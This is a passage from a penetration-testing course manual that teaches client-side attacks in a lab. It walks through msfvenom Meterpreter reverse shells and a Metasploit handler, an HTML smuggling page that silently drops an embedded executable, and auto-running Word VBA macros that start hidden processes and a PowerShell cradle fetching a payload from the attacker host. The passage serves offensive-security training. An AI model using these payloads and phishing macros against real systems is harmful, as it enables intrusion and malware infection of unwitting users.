The msfvenom command we’ll use is similar to the non-staged version. We will select the staged 
payload, choose HTTPS as the protocol (shown in the suffix of the payload), and we’ll set the 
LPORT to 443, the typical HTTPS TCP port. 
Let’s compare the payload sizes by generating both staged and non-staged meterpreter payloads: 
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter_reverse_https 
LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfnonstaged.exe 
... 
Payload size: 207449 bytes 
Final size of exe file: 214016 bytes 
 
47 (Offensive Security, 2019), https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
33 
Saved as: /var/www/html/msfnonstaged.exe.exe 
 
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https 
LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe 
... 
Payload size: 694 bytes 
Final size of exe file: 7168 bytes 
Saved as: /var/www/html/msfstaged.exe 
Listing 8 - Generating Meterpreter executable with both staged and non-staged payloads 
Notice that the non-staged payload is nearly thirty times larger than the staged payload. This 
significantly smaller payload provides less detection surface for endpoint security solutions. 
In order to use staged payloads, we’ll need to use the multi/handler. This Metasploit module 
listens for incoming callbacks from staged payloads and delivers the second stage. 
To do this, we’ll launch msfconsole in quiet mode (-q) and use the multi/handler module. We’ll 
set the payload, LHOST, and LPORT options, which must match the values we used when we 
generated the payload: 
kali@kali:~$ sudo msfconsole -q 
 
msf5 > use multi/handler 
 
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https 
payload => windows/x64/meterpreter/reverse_https 
 
msf5 exploit(multi/handler) > set lhost 192.168.119.120 
lhost => 192.168.119.120 
 
msf5 exploit(multi/handler) > set lport 443 
lport => 443 
 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
Listing 9 - Setting up the multi/handler module 
With the multi/handler module running, we can download our msfstaged.exe executable and run it 
on our victim machine. Then, we’ll turn our attention to the output from Metasploit: 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: pm1qmw8u) 
Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678) 
 
meterpreter >  
Listing 10 - Multi/handler catches the callback and opens a Meterpreter session 
A small 7 KB callback was executed to stage the full payload and we note from the output that 
more than 200 KB of code was sent to spawn the Meterpreter shell from our victim’s machine. 
Now that we understand the differences between Metasploit’s non-staged and staged payloads 
and understand how to use Netcat and the multi/handler to catch the shell, we’ll discuss 
discretion in the next section. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
34 
3.1.2.1 Exercise 
1. 
Experiment with different non-staged and staged Metasploit payloads and use the 
multi/handler module to receive the shell. 
3.1.3 HTML Smuggling 
In the previous sections, we created a malicious executable and tested it by manually 
downloading and running it on a “victim’s” machine. This works well as an example, but attackers 
will often use more discreet delivery methods. For example, an attacker may embed a link in an 
email. When the victim reads the email and visits the webpage, JavaScript code will use HTML 
Smuggling48 to automatically save the dropper file. 
This technique leverages the HTML549 anchor tag download attribute,50 which instructs the 
browser to automatically download a file when a user clicks the assigned hyperlink. 
Let’s try this out by creating an HTML file on our Kali Linux machine’s Apache server. We’ll create 
a simple hyperlink and set the download attribute anchor tag: 
<html> 
    <body> 
      <a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a> 
   </body> 
</html> 
Listing 11 - Anchor object using download attribute 
When a user clicks this link from an HTML5-compatible browser, the msfstaged.exe file will be 
automatically downloaded to the user’s default download directory. 
Although this works well, it exposes the filename and extension of the dropper and requires the 
user to manually click on the link. To avoid this we can trigger the download from an embedded 
JavaScript file. This method feeds the file as an octet stream and will download the assembled 
file without user interaction. 
We’ll demonstrate this by building a proof of concept slowly, explaining each section of the code 
as we go along. 
Let’s discuss the required tasks. First, we’ll create a Base64 Meterpreter executable and store it 
as a Blob51 inside of a JavaScript variable. Next, we’ll use that Blob to create a URL file object that 
simulates a file on the web server. Finally, we’ll create an invisible anchor tag that will trigger a 
download action once the victim loads the page. 
The first hurdle is to store an executable inside JavaScript and allow it to be used with the 
download attribute. By default, the download attribute only accepts files stored on a web server. 
However, it will also accept an embedded Blob object. The Blob object may be instantiated from a 
byte array as shown in Listing 12. 
 
48 (Outflank, 2018), https://outflank.nl/blog/2018/08/14/html-smuggling-explained/ 
49 (w3school, 2019), https://www.w3schools.com/html/html5_intro.asp 
50 (w3school, 2019), https://www.w3schools.com/tags/att_a_download.asp 
51 (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/API/Blob 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
35 
<html> 
    <body> 
        <script> 
            var blob = new Blob([data], {type: 'octet/stream'}); 
        </script> 
    </body> 
</html> 
Listing 12 - Create Blob object from byte array in JavaScript 
Once this Blob has been created, we can use it together with the static URL.createObjectURL()52 
method to create a URL file object. This essentially simulates a file located on a web server, but 
instead reads from memory. The instantiation statement is shown in Listing 13: 
var url = window.URL.createObjectURL(blob); 
Listing 13 - Creating a URL file object 
Now that we have the file object in memory, we can create the anchor object with the 
createElement53 method, specifying the tagName of the anchor object, which is “a”. We’ll then use 
the appendChild()54 method to place the created anchor object in the HTML document and 
specify its attributes. 
First, we’ll set the display style55 to “none” to ensure the anchor is not displayed on the webpage. 
Next, we’ll set .href56 to the URL leading to a remote file, which we’ll embed through the Blob and 
URL file object. Finally, we’ll set the download attribute specifying a filename on the victim’s 
machine. This is all shown in Listing 14. Please note that the filename variable will be set prior to 
the execution of the following code, as we will see later on. 
var a = document.createElement('a'); 
document.body.appendChild(a); 
a.style = 'display: none'; 
var url = window.URL.createObjectURL(blob); 
a.href = url; 
a.download = fileName; 
Listing 14 - Creating Anchor object and setting properties 
With the invisible anchor object created and referencing our Blob object, we can trigger the 
download prompt through the click()57 method. 
a.click(); 
Listing 15 - Triggering the download prompt 
Before we are able to perform the HTML smuggling attack, we need to embed the file. In this 
example, we’ll embed a Meterpreter executable inside the JavaScript code. To avoid invalid 
 
52 (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL 
53 (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement 
54 (w3school, 2019),https://www.w3schools.com/jsref/met_node_appendchild.asp 
55 (w3school, 2019), https://www.w3schools.com/jsref/prop_style_display.asp 
56 (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/API/URL/href 
57 (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/click 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
36 
characters we will Base6458 encode the binary and write a Base64 decoding function that 
converts the file back to its original form and stores it into a byte array. 
function base64ToArrayBuffer(base64)  
{ 
  var binary_string = window.atob(base64); 
  var len = binary_string.length; 
  var bytes = new Uint8Array( len ); 
  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); } 
  return bytes.buffer; 
} 
Listing 16 - Base64 decoding function in JavaScript 
Finally, we can generate a windows/x64/meterpreter/reverse_https payload using our now-
familiar syntax and convert it to base64: 
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https 
LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe 
... 
Payload size: 694 bytes 
Final size of exe file: 7168 bytes 
Saved as: /var/www/html/msfstaged.exe 
 
kali@kali:~$ base64 /var/www/html/msfstaged.exe  
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v 
... 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA== 
Listing 17 - Generating and Base64 encoding the Meterpreter executable 
Before embedding the Base64-encoded executable, we must remove any line breaks or newlines, 
embedding it as one continuous string. Alternatively, we could wrap each line in quotes. 
Now let’s put everything together. First, our Base64 code is placed into an array buffer, byte-by-
byte. We’ll then place the array buffer into our Blob. Next, we’ll create a hidden “a” tag. The data 
from our Blob is then moved to the href reference of our “a” tag. Our Blob code in the href is given 
the file name of ‘msfnonstaged.exe’. Finally, a click action is performed to download our file. The 
complete webpage used to trigger the HTML smuggling with the Meterpreter executable is given 
below: 
<html> 
    <body> 
        <script> 
          function base64ToArrayBuffer(base64) { 
              var binary_string = window.atob(base64); 
              var len = binary_string.length; 
              var bytes = new Uint8Array( len ); 
              for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); 
} 
              return bytes.buffer; 
 
58 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Base64 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
37 
            } 
             
            var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA... 
            var data = base64ToArrayBuffer(file); 
            var blob = new Blob([data], {type: 'octet/stream'}); 
            var fileName = 'msfstaged.exe'; 
             
            var a = document.createElement('a'); 
            document.body.appendChild(a); 
            a.style = 'display: none'; 
            var url = window.URL.createObjectURL(blob); 
            a.href = url; 
            a.download = fileName; 
            a.click(); 
            window.URL.revokeObjectURL(url); 
        </script> 
    </body> 
</html> 
Listing 18 - Complete JavaScript code to trigger HTML smuggling 
After saving the webpage to the web root of our Apache server, we can browse to it using Google 
Chrome from the Windows 10 victim machine. Just browsing the file will cause a trigger to 
download the executable. Unfortunately, a warning may be displayed due to the potentially unsafe 
file format, as shown in Figure 2. 
Note that we chose to browse to the HTML file with Google Chrome since it supports 
window.URL.createObjectURL. This technique must be modified to work against browsers like 
Internet Explorer and Microsoft Edge. 
 
Figure 2: Meterpreter executable is downloaded through HTML smuggling 
This warning may appear because the attachment is saved as an executable. We will ignore this 
warning and download and run it anyway. 
The reason this happens is because the executable originated from a download 
through a browser. When that happens, it is marked as such in Windows and the 
SmartScreen59 feature tries to block execution. We must click More info followed 
by Run anyway to execute it. 
After running the new executable in the Downloads folder, we obtain a reverse Meterpreter shell 
using the multi/handler. 
 
59 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-smartscreen/windows-
defender-smartscreen-overview 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
38 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: kh1ubovt) 
Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 2 opened (192.168.119.120:443 -> 192.168.120.11:49697) 
 
meterpreter > 
Listing 19 - Meterpreter shell from the executable downloaded through HTML smuggling 
3.1.3.1 Exercises 
1. 
Repeat the HTML smuggling to trigger a download of a Meterpreter payload in a file format 
of your choosing. 
2. 
Modify the smuggling code to also use the window.navigator.msSaveBlob60,61 method to 
make the technique work with Microsoft Edge as well. 
3.2 Phishing with Microsoft Office 
So far our attacks required direct interaction with the victim, who must either download a file or 
visit a malicious site. These attacks demonstrated common concepts that work in client-side 
attacks, including the ability to automatically trigger a malicious file download. 
In this section, we’ll turn our attention to another commonly-exploited client-side attack vector: 
Microsoft Office applications. 
Microsoft Office is a very popular software suite employed by the majority of organizations and 
corporations. It comes in two variants, Office 365, which is continuously updated and used for 
online storage, and various standalone versions like Office 2016. 
Due to its popularity, Office applications are a prime target for phishing since victims tend to trust 
them. In fact, an annual Cybersecurity report released by Cisco in 201862 reported that Office was 
the target of 38% of all email phishing attacks. 
Let’s explore this popular attack vector, leveraged through the Visual Basic for Applications 
(VBA)63 embedded programming language. 
3.2.1 Installing Microsoft Office 
Before we can start abusing Microsoft Office, we must install it on the Windows 10 victim VM. 
We do this by navigating to C:\installs\Office2016.img in File Explorer and double-clicking it. This 
will load the file as a virtual CD and allow us to start the install from Setup.exe as shown in Figure 
3. 
 
60 (Microsoft, 2017), https://docs.microsoft.com/en-us/previous-versions/hh772331(v=vs.85) 
61 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-
developer/samples/hh779016(v=vs.85)?redirectedfrom=MSDN 
62 (Cisco, 2019), https://www.cisco.com/c/en/us/products/security/security-reports.html 
63 (Microsoft, 2019), https://docs.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
39 
 
Figure 3: Microsoft Office 2016 installer 
Once the installation is complete, we press Close on the splash screen to exit the installer and 
open Microsoft Word from the start menu. Once Microsoft Word opens, a popup as shown in 
Figure 4 will appear. We can close it by clicking the highlighted cross in the upper-right corner to 
start the 7-day trial. 
 
Figure 4: Product key popup 
As the last step, a license agreement popup is shown and must be accepted by pressing Accept 
and start Word as shown in Figure 5. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
40 
 
Figure 5: Accept license agreement 
With Microsoft Office, and in particular Microsoft Word, installed and configured we can start to 
investigate how it can be abused for client side code execution. 
3.2.1.1 Exercise 
1. 
Install Microsoft Office on your Windows 10 client VM. 
3.2.2 Introduction to VBA 
In this module, we’ll discuss the basics of VBA, along with the embedded security mechanisms of 
Microsoft Office. 
We’ll begin by creating our first macro, which will include a few conditional statements and 
message boxes. Then we’ll try to run a command prompt from MS Word, with the help of 
Windows Script Host. 
To begin our development, we’ll open Microsoft Word on the Windows 10 victim machine and 
create a new document. We can access the Macro menu by navigating to the View tab and 
selecting Macros as shown in Figure 6. 
In this module, we are creating the macro and Office documents on the victim 
machine, but in a real penetration test, this would be done on a local 
development box and not on a compromised host. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
41 
 
Figure 6: Macros menu in Microsoft Word 
From the Macros dialog window, we must choose the current document from the drop down 
menu. For an unnamed document this is called “Document1 (document)”. Verify this to ensure 
that the VBA code is only embedded in this document, otherwise the VBA code will be saved to 
our global template. 
 
Figure 7: Selecting macros in the current document 
After selecting the current document, we’ll enter a name for the macro. In this example, we’ll 
name the macro “MyMacro” and then select Create. This will launch the VBA editor where we can 
run and debug the code. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
42 
 
Figure 8: VBA editor in Microsoft Word 
When we create a macro, the editor automatically creates a small starting code segment as 
shown in Figure 8. The important keyword in the small code segment is Sub MyMacro,64 which 
defines the beginning of a method called “MyMacro” while End Sub ends the method. Note that in 
VBA, a method cannot return values to its caller, but a Function (bracketed with keywords like 
“Function MyMacro”" and “End Function”) can. 
Variables are very useful when programming and like many other programming languages, VBA 
requires that they be declared before use. This is done through the Dim65 keyword with two other 
parameters; the name of the variable and its datatype.66 Let’s declare a few sample variables 
(Listing 20): 
Dim myString As String 
Dim myLong As Long 
Dim myPointer As LongPtr 
Listing 20 - Declaring variables of different types in VBA 
In the example above, we have used three very common data types: String, Long, and LongPtr. 
These data types directly translate to a unicode string, a 64-bit integer, and a memory pointer, 
respectively. They represent the operating system’s native data types and are commonly used in 
languages such as C or C++. 
 
64 (Free Excel Help, 2019), https://www.excel-easy.com/vba/function-sub.html 
65 (Microsoft, 2018),https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/statements/dim-statement 
66 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/data-types/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
43 
Now that we know how to declare variables, we can use and manipulate them with flow 
statements. These include the If and Else statements67 as illustrated in Listing 21 and the For68 
loop as shown in Listing 22. Let’s explore these in more detail. 
The If and Else statements are complimented by the Then and End If keywords to generate a 
complete branching statement. When an If condition is met, the Then condition is executed, 
otherwise the Else condition is executed. Once all conditions are evaluated, the End If exits the 
branching condition. 
In the example below, we’ll have our macro check the value of a variable and based on the result, 
display the appropriate built-in MsgBox69 function. 
Sub MyMacro() 
 
Dim myLong As Long 
 
myLong = 1 
 
If myLong < 5 Then 
    MsgBox ("True") 
Else 
    MsgBox ("False") 
End If 
 
End Sub 
Listing 21 - If and Else statements in VBA 
To execute the macro we either click the “Run Macro” button or press %. 
 
Figure 9: Run Macro button 
This macro will display a “True” message box since the myLong variable is less than five. 
Next, we’ll explore the For loop, which increments a counter through the Next keyword. This is 
illustrated below in Listing 22. 
Sub MyMacro() 
 
For counter = 1 To 3 
    MsgBox ("Alert") 
Next counter 
 
End Sub 
Listing 22 - For loop in VBA 
 
67 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/concepts/getting-started/using-ifthenelse-statements 
68 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/fornext-statement 
69 (Microsoft, 2019), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/msgbox-function 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
44 
The For loop will read the counter three times and each time it reaches the Next keyword, it will 
increment the value of counter by one. The execution of this macro will present three “Alert” 
message boxes. 
Now that we have briefly discussed custom methods and statements, we’ll switch our attention 
to our ultimate goal: making the victim execute our custom macro. Since our victim will likely not 
do this willingly, we’ll need to leverage existing methods like Document_Open()70 and AutoOpen(),71 
both of which will execute when the Word document is opened. 
There are some differences between the various Office applications utilization of 
VBA. For example, Document_Open() is called Workbook_Open() in Excel. 
In order for this to work, we must save our document in a Macro-Enabled format such as .doc or 
.docm.72 The newer .docx will not store macros. 
To test out this functionality, we’ll use a very simple macro as shown in Listing 23. 
Sub Document_Open() 
    MyMacro 
End Sub 
 
Sub AutoOpen() 
    MyMacro 
End Sub 
 
Sub MyMacro() 
    MsgBox ("This is a macro test") 
End Sub 
Listing 23 - Simple Word Macro that automatically executes 
This example uses both Document_Open and AutoOpen for redundancy. 
We’ll save the document in the legacy .doc format (also called Word 97-2003 Document) and 
close it. 
Now that the document is saved, we can try opening it again. However, we are presented with a 
security warning banner instead of our message box output, as shown in Figure 10. 
 
Figure 10: Macro security warning in Microsoft Word 
 
70 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/api/word.document.open 
71 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros 
72 (Microsoft, 2019), https://docs.microsoft.com/en-us/deployoffice/compat/office-file-format-reference 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
45 
 
If we press the Enable Content button, the macro will execute and the message box will appear. 
This is the default security setting of any Office application. This means that when we launch this 
client-side attack, we must somehow persuade the victim to both open the document and enable 
the macro. 
We can inspect these security settings by navigating to File > Options > Trust Center and opening 
Trust Center Settings: 
 
Figure 11: Trust Center in Microsoft Word 
Within Trust Center, the default security setting is to “Disable all macros with notification”: 
 
Figure 12: Macro Settings in Trust Center 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
46 
 
The Protected View options describe a sandbox feature introduced in Microsoft Office 2010 that 
is enabled when documents originate from the Internet. 
 
Figure 13: Protected View in Trust Center 
When Protected View is enabled, macros are disabled, external images are blocked, and the user 
is presented with an additional warning message as shown in Figure 14. 
 
Figure 14: Protected View security warning in Microsoft Word 
This complicates our situation since our client-side attack must trick the user into also turning off 
Protected View when the document is opened. We’ll address this shortly. 
To wrap up this section, we’ll demonstrate how to use VBA to launch an external application like 
cmd.exe. This will serve as a foundation for other techniques we will use in the rest of the course. 
The first and simplest technique leverages the VBA Shell73 function, which takes two arguments. 
The first is the path and name of the application to launch along with any arguments. The second 
is the WindowStyle, which sets the program’s window style. As attackers, the vbHide value or its 
numerical equivalent (0) is the most interesting as it will hide the window of the program 
launched. 
In the example below, as soon as the victim enables macros, we will launch a command prompt 
with a hidden window. 
 
73 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/shell-function 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
47 
Sub Document_Open() 
    MyMacro 
End Sub 
 
Sub AutoOpen() 
    MyMacro 
End Sub 
 
Sub MyMacro() 
    Dim str As String 
    str = "cmd.exe" 
    Shell str, vbHide 
End Sub 
Listing 24 - Macro to execute cmd from the Shell method 
Saving the macro and reopening the Word document will run the macro without any security 
warnings, because we already enabled the macros on this document. If we rename the 
document, the security warning will reappear. 
Since the command prompt was opened as a hidden window, it is not displayed, but we can verify 
that it is running. We can use Process Explorer from SysInternals74 (located in the C:\Tools folder) 
to list information about running processes and which handles and DLLs they have opened or 
loaded. In our case, running it will list cmd.exe as a child process of WINWORD.EXE. 
 
Figure 15: Cmd.exe as child process of Microsoft Word 
We can also use Windows Script Host (WSH)75 to launch a shell. To do this, we’ll invoke the 
CreateObject76 method to create a WSH shell, and from there we can call the Run method.77 While 
this might sound complicated, it is relatively simple as displayed in Listing 25. 
Sub Document_Open() 
    MyMacro 
End Sub 
 
Sub AutoOpen() 
    MyMacro 
 
74 (Microsoft, 2019), https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer 
75 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Windows_Script_Host 
76 (SS64, 2019), https://ss64.com/vb/createobject.html 
77 (SS64, 2019) https://ss64.com/vb/run.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
48 
End Sub 
 
Sub MyMacro() 
    Dim str As String 
    str = "cmd.exe" 
    CreateObject("Wscript.Shell").Run str, 0 
End Sub 
Listing 25 - Macro execute cmd from Windows Script Host 
In the listing above, the call to CreateObject returns the WSH object, from which we invoke the 
Run method, supplying the path and name of the application to execute along with the vbHide 
window style (0). Executing the Macro will once again open cmd.exe as a hidden process. 
In this section we learned the basics of VBA and Microsoft Office macros. We discussed the If 
statement and For loops. We also examined the Trust Center and discussed the different file 
extensions needed to save macros. We also briefly discussed how we can use VBA to execute 
other applications. In the next section, we will build upon this to learn how to execute Meterpreter 
shellcode. 
3.2.2.1 Exercises 
1. 
Experiment with VBA programming basics by creating a small macro that prints the current 
username and computer name 5 times using the Environ$ function. 
2. 
Create an Excel macro that runs when opening an Excel spreadsheet and executes cmd.exe 
using Workbook_Open.78 
3.2.3 Let PowerShell Help Us 
So far, we have focused on Microsoft Office and discussed the very basic mechanics of VBA 
macros. Next, we’ll discuss how we can use the extremely powerful and flexible PowerShell 
environment together with phishing attacks using Word or Excel documents. 
As discussed in the previous section, VBA is a compiled language that makes use of types. On the 
other hand, PowerShell is compiled and executed on the fly through the .NET framework, 
generally does not use types and offers more flexibility. 
To declare a variable in PowerShell, we simply use the dollar sign ($) character. PowerShell 
control logic such as branching statements and loops follow similar syntax as most other 
scripting languages. The biggest syntactical difference is in comparisons. PowerShell does not 
use the typical == or != syntax but instead uses -eq, -ne, and similar.79 
Since PowerShell has access to the .NET framework, we can easily implement specialized 
techniques such as download cradles to download content (like second stage payloads) from 
external web servers. The most commonly used variant is the Net.WebClient class.80 By 
 
78 (Automate Excel, 2019), https://www.automateexcel.com/vba/auto-open-macro/ 
79 (SS64, 2019), https://ss64.com/ps/syntax-compare.html 
80 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
49 
instantiating an object from this class, we can call the DownloadFile81 method to download any 
file from a web server to the victim. 
In the following example, we’ll show how to invoke the DownloadFile method. We’ll start by 
assembling a full script and then reduce it to a single one-liner. 
DownloadFile takes two arguments: the URL of the file to be downloaded and the output filename. 
The entire download procedure can be written in just four lines of PowerShell, as shown in Listing 
26. 
$url = "http://192.168.119.120/msfstaged.exe" 
$out = "msfstaged.exe" 
$wc = New-Object Net.WebClient 
$wc.DownloadFile($url, $out) 
Listing 26 - PowerShell code to download Meterpreter executable 
First, we created a variable for the file we want to download, then a variable for the name of the 
local file. Next, we instantiated the Net.WebClient class to create a download cradle from which 
we then invoke the DownloadFile method to download the file. In this case, we used the same 
staged Meterpreter executable we created earlier. 
Alternatively, the four lines can be compressed into a single one-liner: 
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 
'msfstaged.exe') 
Listing 27 - PowerShell one-liner to download Meterpreter executable 
Let’s embed this into our Word macro using VBA and have PowerShell do the heavy lifting for us. 
We will slowly build it here, piece by piece, and then review the completed code. 
Most PowerShell download cradles use HTTP or HTTPS, but it is possible to 
make a PowerShell download cradle82 that uses TXT records83 and a DNS 
transport. 
As an overview, we’ll set up a download cradle by converting our PowerShell string to work in 
VBA. Then we will give the system time to download the file and finally we will execute the file. 
Let’s start writing our VBA code. The first step is to declare our string variable and fill that string 
with the code of our PowerShell download cradle. Next, we’ll use the Shell method to start 
PowerShell with the one-liner as an argument. We’ll then instruct the Shell method to run the code 
with the output hidden from the user. 
The code segment shown in Listing 28 will download the file to our victim’s machine: 
 
81 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=netframework-4.8 
82 (Evilmog, 2017), https://github.com/evilmog/evilmog/wiki/DNS-Download-Cradle 
83 (Wikipedia, 2014), https://en.wikipedia.org/wiki/TXT_record 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
50 
Dim str As String 
str = "powershell (New-Object 
System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 
'msfstaged.exe')" 
Shell str, vbHide 
Listing 28 - VBA code to invoke the PowerShell download cradle 
Before executing this code, we must place the Meterpreter executable (msfstaged.exe) on our Kali 
web server along with a multi/handler listener. 
To execute the Meterpreter executable through VBA, we must specify the full path. Luckily, 
downloaded content will end up in the current folder of the Word document and we can obtain the 
path name with the ActiveDocument.Path84 property as shown in Listing 29. 
Dim exePath As String 
exePath = ActiveDocument.Path + "\msfstaged.exe" 
Listing 29 - Getting file path from ActiveDocument.Path 
Since we are downloading the Meterpreter executable from a web server and the download time 
may vary, we must introduce a time delay. Unfortunately, Microsoft Word does not have a wait or 
sleep VBA function like Excel, so we’ll implement a custom Wait method using a Do85 loop and the 
Now86 and DateAdd87 functions. 
This will allow us to pass a Wait parameter (measured in seconds), and pause the execution. To 
ensure that our Wait procedure does not block Microsoft Word, each iteration calls DoEvents88 to 
allow processing of other actions. 
To begin, we’ll retrieve the current date and time with the Now function and save it to the t 
variable. Then we’ll use a Do loop, which will work through the comparison declared in the Loop 
Until statement. 
Sub Wait(n As Long) 
    Dim t As Date 
    t = Now 
    Do 
        DoEvents 
    Loop Until Now >= DateAdd("s", n, t) 
End Sub 
Listing 30 - VBA wait method using dates 
This code will continue to loop until the comparison is true, which happens when the current time 
(returned by Now) is greater than the time returned by the DateAdd function. This function takes 
three arguments: a string expression that represents the interval of time (“s”), the number of 
seconds to wait (n), and the current time (t). 
 
84 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/api/word.document.path 
85 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/doloop-statement 
86 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/now-function 
87 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/dateadd-function 
88 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/doevents-function 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
51 
Simply stated, “n” seconds are added to the time the loops starts and the result is compared to 
the current time. Once “n” seconds have passed, the loop completes. 
With the Wait method implementation in place we just need to invoke it and then execute the 
Meterpreter executable. To do that, we’ll again use the Shell function and call the exePath we 
created. 
The complete VBA macro is shown below in Listing 31. 
Sub Document_Open() 
    MyMacro 
End Sub 
